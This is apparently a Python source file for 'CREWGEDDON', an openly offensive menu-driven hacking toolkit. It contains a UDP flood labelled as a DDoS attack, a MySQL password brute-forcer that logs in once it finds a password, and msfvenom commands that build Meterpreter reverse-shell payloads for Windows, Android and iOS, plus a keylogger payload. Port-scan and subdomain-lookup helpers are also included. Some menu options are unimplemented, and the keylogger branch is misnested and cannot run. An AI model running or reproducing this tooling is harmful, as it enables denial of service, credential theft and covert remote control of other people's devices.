from colorama import Fore, Back, Style
import socket
import random
import os
import time
import pymysql
pymysql.install_as_MySQLdb()
import requests

os.system("cls")
os.system("clear")
print(Fore.RED + """
 ██████╗ ██████╗ ███████╗ ██╗    ██╗  ██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███╗  ██╗
██╔════╝ ██╔══██╗ ██╔════╝ ██║    ██║ ██╔════╝ ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔═══██╗ ████╗  ██║
██║      ██████╔╝ █████╗   ██║ █╗ ██║ ██║  ███╗ █████╗   ██║  ██║ ██║  ██║ ██║   ██║ ██╔██╗ ██║
██║      ██╔══██╗ ██╔══╝   ██║███╗██║ ██║   ██║ ██╔══╝   ██║  ██║ ██║  ██║ ██║   ██║ ██║╚██╗██║
╚██████╗ ██║  ██║ ███████╗ ╚███╔███╔╝ ╚██████╔╝ ███████╗ ██████╔╝ ██████╔╝ ╚██████╔╝ ██║ ╚████║
 ╚═════╝ ╚═╝  ╚═╝ ╚══════╝  ╚══╝╚══╝   ╚═════╝  ╚══════╝ ╚═════╝  ╚═════╝   ╚═════╝  ╚═╝  ╚═══╝
      
Discord: crew.dev             GitHub: crewcik
""")
print(Fore.GREEN + "[1]" + Fore.BLUE + " - Open Port Search")
print(Fore.GREEN + "[2]" + Fore.BLUE + " - Web See IP")
print(Fore.GREEN + "[3]" + Fore.BLUE + " - Ddos Attack")
print(Fore.GREEN + "[4]" + Fore.BLUE + " - MySql Brute Force")
print(Fore.GREEN + "[5]" + Fore.BLUE + " - Sub Domain Scanner")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[6]" + Fore.BLUE + " - RAT Tools")
print(Fore.GREEN + "[7]" + Fore.BLUE + " - KeyLogger Tools")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[8]" + Fore.BLUE + " - Wifi Hack Tools (Monitor Mode)")
print(Fore.GREEN + "[9]" + Fore.BLUE + " - Wifi Monitor Mode")
print(Fore.GREEN + "[10]" + Fore.BLUE + " - Wifi Managed Mode")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[11]" + Fore.BLUE + " - Exit")
print(" ")
while True:
      select = input(Fore.CYAN + "CREWGEDDON~#: ")

      if select == "1":
          host = input(Fore.BLUE + "[CREWGEDDON]: Enter IP Address: ")
          ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]
          for p in ports:
              with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                  s.settimeout(0.5)
                  if s.connect_ex((host, p)) == 0:
                      print(Fore.GREEN + f"[CREWGEDDON]-[{host}]: OPEN: {p}")
                  else:
                      print(Fore.RED + f"[CREWGEDDON]-[{host}]: CLOSED: {p}")
      elif select == "2":
            url = input(Fore.BLUE + "[CREWGEDDON]: Enter Website URL (crew.com): ")
            ip_address = socket.gethostbyname(url)
            if ip_address:
                  print(Fore.GREEN + f"[CREWGEDDON]: The IP address of {url} is {ip_address}")
            else:
                  print(Fore.RED + "[CREWGEDDON]: Could not retrieve IP address.")
      elif select == "3":
            print(Fore.RED + "[CREWGEDDON]: Welcome to the DDoS Attack") 
            print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
            print(Fore.GREEN + "[1]" + Fore.BLUE + " - Web Sites Attack")
            ddos_select = int(input(Fore.RED + "CREWGEDDON-DDOS~#: "))
            if ddos_select == 0:
                continue
            if ddos_select == 1:
                  ip = input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter IP Adress: ")
                  port = int(input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter Port: "))
                  crewsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                  counter = 0
                  crewrandom = random.randbytes(9999)
                  while True:
                       crewsock.sendto(crewrandom, (ip, port))
                       time.sleep(0.5)
                       print(Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"The attack is being successfully sent to {ip} (%{counter})")
                       counter = counter + 1
                       if counter >= 5000:
                            print(Fore.RED + "[CREWGEDDON-DDOS]: The attack stoped.")
                            break
      elif select == "4":
                  print(Fore.RED + "[CREWGEDDON]: Welcome to MySql Brute Force Tool")
                  host = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql Host (localhost): ")
                  user = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql User (root): ")
                  password_file = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter Password File Path (passwords.txt): ")
                  passwords = open(password_file, "r").readlines()
                  for password in passwords:
                      password = password.strip()
                      try:
                        db = pymysql.connect(host, user, password)
                        print(Fore.GREEN + f"[CREWGEDDON-MySql]: Success! Password found: {password}")
                        mysql_login = input(Fore.BLUE + "[CREWGEDDON-MySql]: Login MySql? (y/n): ")
                        
                        if mysql_login.lower() == "y":
                              os.system(f"mysql -u {user} -p {password} -h {host}")
                        elif mysql_login.lower() == "n":
                              break
                        else:
                              print(Fore.RED + "[CREWGEDDON-MySql]: Invalid option selected.")
                              break
                        
                      except pymysql.Error:
                          print(Fore.RED + f"[CREWGEDDON-MySql]: Failed attempt with password: {password}") 
      elif select == "5":
            domain = input(Fore.BLUE + "[CREWGEDDON]: Enter Domain (crew.com): ").strip()
            url = f"https://crt.sh/?q=%25.{domain}&output=json"

            try:
                resp = requests.get(url, timeout=30)
                resp.raise_for_status()
            except requests.RequestException as e:
                print(Fore.RED + f"[CREWGEDDON]: Request failed: {e}")
            try:
                data = resp.json()
            except ValueError:
                print(Fore.RED + "[CREWGEDDON]: Not return JSON")
            subs = set()

            for entry in data:
                name = entry.get("name_value")
                if not name:
                    continue
                for n in name.splitlines():
                    n = n.strip()
                    if n.endswith(domain):
                        subs.add(n)

            if not subs:
                print(Fore.YELLOW + "[CREWGEDDON-SubDomain]: No subdomains found.")
            else:
                print(Fore.BLUE + "[CREWGEDDON-SubDomain]: Subdomains found:")
                for sub in sorted(subs):
                    print(Fore.GREEN + f"[CREWGEDDON-SubDomain]: {sub}")
                    
      elif select == "6":
        print(Fore.RED + "[CREWGEDDON]: Welcome to RAT Tools")
        print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
        print(Fore.GREEN + "[1]" + Fore.BLUE + " - Desktop RAT")
        print(Fore.GREEN + "[2]" + Fore.BLUE + " - Android RAT")
        print(Fore.GREEN + "[3]" + Fore.BLUE + " - IOS RAT")
        rat_select = int(input(Fore.CYAN + "CREWGEDDON-RAT~#: "))

        if rat_select == 0:
            continue
        elif rat_select == 1:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter LOCAL IP: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter LOCAL PORT: "))
            exe_name = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter EXE NAME: ")
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
            print(Fore.GREEN + f"[CREWGEDDON-DesktopRAT]: {exe_name}.exe created successfully. Location: root/{exe_name}.exe")
        elif rat_select == 2:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter LOCAL IP: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter LOCAL PORT: "))
            apk_name = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter APK NAME: ")
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f apk > {apk_name}.apk")
            print(Fore.GREEN + f"[CREWGEDDON-AndroidRAT]: {apk_name}.apk created successfully. Location: root/{apk_name}.apk")
        elif rat_select == 3:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter LOCAL IP: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter LOCAL PORT: "))
            app_name = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter APP NAME: ")
            os.system(f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={ip_adress} LPORT={port} -f macho > {app_name}.macho")
            print(Fore.GREEN + f"[CREWGEDDON-iOSRAT]: {app_name}.macho created successfully. Location: root/{app_name}.macho")
        
        elif select == "7":
            print(Fore.RED + "[CREWGEDDON]: Welcome to KeyLogger Tools")
            print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
            print(Fore.GREEN + "[1]" + Fore.BLUE + " - Create KeyLogger")
            keylogger_select = int(input(Fore.CYAN + "CREWGEDDON-KeyLogger~#: "))

            if keylogger_select == 0:
                continue
            elif keylogger_select == 1:
                ip_adress = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter LOCAL IP: ")
                port = int(input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter LOCAL PORT: "))
                exe_name = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter EXE NAME: ")
                os.system(f"msfvenom -p windows/x64/keylogger/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
                print(Fore.GREEN + f"[CREWGEDDON-KeyLogger]: {exe_name}.exe created successfully. Location: root/{exe_name}.exe")
      elif select == "11":
            print(Fore.RED + "[CREWGEDDON]: Exiting...")
            os.system("exit")
            break
      else: 
            print(Fore.RED + "[CREWGEDDON]: Invalid option selected.")

# Developed By: Crew
# Since I've shared the project as open source and the development process is ongoing, there are some shortcomings. You can write your own updates or follow the updates.
# Projeyi açık kaynak olarak paylaştığım için ve geliştirme süreci devam ettiği için eksikler mevcuttur. Sizler kendiniz yazabilir veya güncellemeleri takip edebilirsiniz.
